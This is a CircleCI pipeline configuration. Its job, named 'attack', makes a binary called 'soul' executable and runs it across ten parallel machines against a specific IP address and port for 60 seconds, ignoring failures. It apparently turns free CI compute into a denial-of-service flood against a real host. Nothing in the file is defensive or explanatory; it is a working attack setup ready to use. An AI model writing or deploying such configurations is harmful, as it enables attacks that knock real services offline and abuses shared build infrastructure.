version: 2.1
jobs:
  attack:
    machine:
      image: ubuntu-2204:current
    resource_class: medium
    parallelism: 10
    steps:
      - checkout
      - run:
          name: Run Attack
          command: |
             chmod +x soul
             ./soul 20.198.79.236 18970 60 || true

workflows:
  attack_flow:
    jobs:
      - attack
